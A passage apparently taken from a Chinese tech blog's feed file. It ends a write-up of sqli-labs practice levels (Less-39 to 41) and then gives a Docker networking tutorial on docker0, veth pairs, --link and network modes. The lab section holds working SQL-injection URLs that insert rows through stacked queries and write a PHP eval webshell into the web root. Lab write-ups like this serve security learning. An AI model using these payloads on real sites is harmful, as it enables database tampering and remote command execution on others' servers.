class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">20</span><span class="comment">--%20a 能写webshell</span></span><br><span class="line">#测试读文件未成功</span><br></pre></td></tr></table></figure><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-39</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--%20a #正常注入可以拿数据</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-39</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span>;<span class="keyword">insert</span><span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>users(id,username,password)<span class="operator">%</span><span class="number">20</span><span class="keyword">values</span><span class="operator">%</span><span class="number">20</span>(<span class="operator">%</span><span class="number">2739</span><span class="operator">%</span><span class="number">27</span>,<span class="operator">%</span><span class="number">27</span>M0th<span class="operator">%</span><span class="number">27</span>,<span class="operator">%</span><span class="number">27</span>M0th<span class="operator">%</span><span class="number">27</span>)<span class="comment">--%20a #能加行</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-39</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">0</span>;<span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">3</span>C?php<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">20</span><span class="variable">@eval</span>($_POST[<span class="operator">%</span><span class="number">27</span>cmd<span class="operator">%</span><span class="number">27</span>]);?<span class="operator">%</span><span class="number">3</span>E<span class="operator">%</span><span class="number">22</span>,<span class="number">3</span><span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>outfile<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">22</span>D:\\phpstudy_pro\\WWW\\sqli\\less<span class="number">-39</span>\\webshell1.php<span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">20</span><span class="comment">--%20a #能写webshell</span></span><br></pre></td></tr></table></figure><h3 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-40</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span><span class="number">27</span>)<span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--%20a #正常注入可以拿数据</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-40</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;);insert into users(id,username,password) value (&#x27;</span><span class="number">40</span><span class="string">&#x27;,&#x27;</span>M0th<span class="string">&#x27;,&#x27;</span>M0th<span class="string">&#x27;); -- a #能添加数据</span></span><br><span class="line"><span class="string">http://sqli/Less-40/?id=0%27);select%201,%22%3C?php%20@eval(system($_POST[%27M0th%27]));?%3E%22,3%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli\\less-40\\webshell.php%22%20--%20a #能写webshell</span></span><br></pre></td></tr></table></figure><h3 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-40</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;insert into users(id,username,password) value (&#x27;</span><span class="number">41</span><span class="string">&#x27;,&#x27;</span>M0th<span class="string">&#x27;,&#x27;</span>M0th<span class="string">&#x27;); -- a</span></span><br></pre></td></tr></table></figure><h3 id="less-40-1"><a href="#less-40-1" class="headerlink" title="less-40"></a>less-40</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="less-40-2"><a href="#less-40-2" class="headerlink" title="less-40"></a>less-40</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="less-40-3"><a href="#less-40-3" class="headerlink" title="less-40"></a>less-40</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="less-40-4"><a href="#less-40-4" class="headerlink" title="less-40"></a>less-40</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="less-40-5"><a href="#less-40-5" class="headerlink" title="less-40"></a>less-40</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker从入门到精通(五)</title>
      <link href="2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/"/>
      <url>2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/</url>
      
        <content type="html"><![CDATA[<p>深层次学习docker，docker网络</p><span id="more"></span><h2 id="docker网络"><a href="#docker网络" class="headerlink" title="docker网络"></a>docker网络</h2><h3 id="理解Docker0"><a href="#理解Docker0" class="headerlink" title="理解Docker0"></a>理解Docker0</h3><p>清空所有环境，查看网络配置</p><blockquote><p>测试</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker rm -f $(docker ps -aq)</span><br><span class="line">2559b0597e1c</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    link/ether 00:16:3e:03:cd:f3 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.24.11.56/18 brd 172.24.63.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315230835sec preferred_lft 315230835sec</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN </span><br><span class="line">    link/ether 02:42:ff:51:d9:f0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>共有三个网络</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">问题： docker是如何处理容器网络访问的</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113230326652.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113230326652.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210113230326652"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat01 tomcat</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">查看容器的内部网络地址  ip addr ，发现容器有一个 eth0@if11的网卡，这是docker分配的</span></span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat01 ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="meta">#</span><span class="bash">此时 linux服务器可以直接ping通docker容器</span></span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# ping 172.17.0.2</span><br><span class="line">PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.059 ms</span><br><span class="line">64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.050 ms</span><br><span class="line">64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.050 ms</span><br><span class="line">64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.050 ms</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>原理</p></blockquote><ol><li><p>我们每启动一个docker容器，docker就会给docker容器分配一个ip，我们只要安装了docker，就会有一个网卡docker0 桥接模式，使用的技术是 evth-pair技术</p><p>再次测试linux服务器的ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# ip addr</span><br></pre></td></tr></table></figure><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113231902061.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113231902061.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210113231902061"></p></li><li><p>再启动一个容器，查看ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    link/ether 00:16:3e:03:cd:f3 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.24.11.56/18 brd 172.24.63.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315229578sec preferred_lft 315229578sec</span><br><span class="line">3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP </span><br><span class="line">    link/ether 02:42:ff:51:d9:f0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">11: veth2cdc73e@if10: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP </span><br><span class="line">    link/ether 5a:d8:d7:7e:ec:f0 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">13: veth19f896c@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP </span><br><span class="line">    link/ether 46:c7:22:af:f9:26 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们发现又多了一个网卡<img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113232103991.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113232103991.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210113232103991"></p><p>我们仔细观察，多的网卡其实是成对存在的</p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113232300117.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113232300117.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210113232300117"></p><p>我们查看tomcat02容器的ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">12: eth0@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113232504223.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210113232504223.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210113232504223"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">我们发现这些容器带来的网卡都是一对一对的</span></span><br><span class="line"><span class="meta">#</span><span class="bash">evth-pair 就是一对的虚拟设备几口，他们都是成对出现的，一段连着协议，一段彼此相连</span></span><br><span class="line"><span class="meta">#</span><span class="bash">正因为这个特性，evth-pair 充当了一个桥梁，连接着各种虚拟网络设备</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Openstac，Docker容器之间的连接，ovs的连接，都是使用evth-pair技术</span></span><br></pre></td></tr></table></figure></li><li><p>我们来测试下tomcat01是否可以ping通tomcat02的ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   [root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ip addr</span><br><span class="line">   1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">       link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">       inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">   12: eth0@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">       inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">   [root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat01 ping 172.17.0.3</span><br><span class="line">PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.</span><br><span class="line">   64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.083 ms</span><br><span class="line">64 bytes from 172.17.0.3: icmp_seq=2 ttl=64 time=0.073 ms</span><br><span class="line">   64 bytes from 172.17.0.3: icmp_seq=3 ttl=64 time=0.061 ms</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">绘制一幅docker网络模型图</span><br><span class="line">   </span><br><span class="line">![image-20210113233634209](docker从入门到精通-五&#x2F;image-20210113233634209.png)</span><br><span class="line">   </span><br><span class="line">结论：tomcat01和tomcat02是公用的一个路由器，docker0</span><br><span class="line">   </span><br><span class="line">所有的容器不指定网络的情况下，都是docker0路由的，docker会给我们的容器分配一个任意的可用ip</span><br><span class="line">   </span><br><span class="line">   &gt; 小结</span><br><span class="line">   </span><br><span class="line">   ​Docker使用的是linux的桥接，宿主机中有一个docker容器的网桥 docker0</span><br><span class="line">   </span><br><span class="line">   ![image-20210113234027074](docker从入门到精通-五&#x2F;image-20210113234027074.png)</span><br><span class="line">   </span><br><span class="line">   ​docker中所有网络接口都是虚拟的，所以效率非常高！</span><br><span class="line">   </span><br><span class="line">   只要容器删除，对应的网卡就会删除</span><br><span class="line">   </span><br><span class="line">   ![image-20210114094421014](docker从入门到精通-五&#x2F;image-20210114094421014.png)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">### --link</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&gt; 思考一个场景，我们编写了一个微服务，database url&#x3D;ip；项目不重启，数据库ip换掉了，我们希望可以处理这个问题，是否可以通过名字访问容器</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;shell</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ping tomcat01</span><br><span class="line">ping: tomcat01: Name or service not known</span><br><span class="line">#而然，通过--link就可以通过名字来访问</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name  tomcat03 --link tomcat02 tomcat</span><br><span class="line">9f18f11fee160157d9c539f9277bf84e173cde4929fda8cce0843c526b3b8f6b</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat03 ping tomcat02</span><br><span class="line">PING tomcat02 (172.17.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from tomcat02 (172.17.0.3): icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.084 ms</span><br><span class="line">64 bytes from tomcat02 (172.17.0.3): icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;0.058 ms</span><br><span class="line">64 bytes from tomcat02 (172.17.0.3): icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;0.061 ms</span><br><span class="line">64 bytes from tomcat02 (172.17.0.3): icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;0.059 ms</span><br><span class="line">#tomcat03能够ping通tomcat02是否意味着tomcat02能够ping通tomcat03</span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat02 ping tomcat03</span><br><span class="line">ping: tomcat03: Name or service not known</span><br><span class="line">#答案是并不可以</span><br></pre></td></tr></table></figure></li></ol><p>探究：inspect</p><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114094546215.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114094546215.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210114094546215"></p><p>其实这个tomcat03 就是在本地配置了tomcat02的配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看 hosts 配置，在这里原理发现！</span></span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker exec -it tomcat03 cat /etc/hosts</span><br><span class="line">127.0.0.1localhost</span><br><span class="line">::1localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0ip6-localnet</span><br><span class="line">ff00::0ip6-mcastprefix</span><br><span class="line">ff02::1ip6-allnodes</span><br><span class="line">ff02::2ip6-allrouters</span><br><span class="line">172.17.0.3tomcat02 8ddaead46e6d</span><br><span class="line">172.17.0.49f18f11fee16</span><br></pre></td></tr></table></figure><p>–link 就是我们在hosts配置中增加了一个 <code>172.17.0.3    tomcat02 8ddaead46e6d</code></p><p>我们现在玩Docker 已经不建议使用 –link了！</p><p>自定义网络！不适用docker0！</p><p>docker0问题：他不支持容器名连接访问！</p><h3 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h3><hr><blockquote><p>查看所有的docker网络</p></blockquote><p><img src="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114101006785.png" class="lazyload" data-srcset="/2021/01/13/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%BA%94/image-20210114101006785.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210114101006785"></p><h4 id="网络模式"><a href="#网络模式" class="headerlink" title="网络模式"></a><strong>网络模式</strong></h4><blockquote><p>bridge：桥接 docker（默认）</p><p>none：不配置网络</p><p>host：和宿主级共享网络</p><p>container：容器网络联通！（用的少！局限很大）</p></blockquote><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"> #</span><span class="bash"> 我们直接启动的命令 --net bridge，而这个就是我们的docker0</span></span><br><span class="line">[root@iz2zeg4zg69ldanw7ftdhez ~]# docker run -d -P --name tomcat01 --net bridge tomcat</span><br><span class="line">00673172fe3bcf4820070cb18149bbe43d9288d5320e6b3fce45de510155ee5f</span><br><span class="line"><span class="meta">#</span><span class="bash">和这个 docker run -d -P --name tomcat01 tomcat 一样</span></span><br><span class="line"><span class="meta">#</span><span class="bash">docker0 特点：默认，域名不能访问，--link之后可以打通连接！</span></span><br><span class="line"><span class="meta">#</span><span 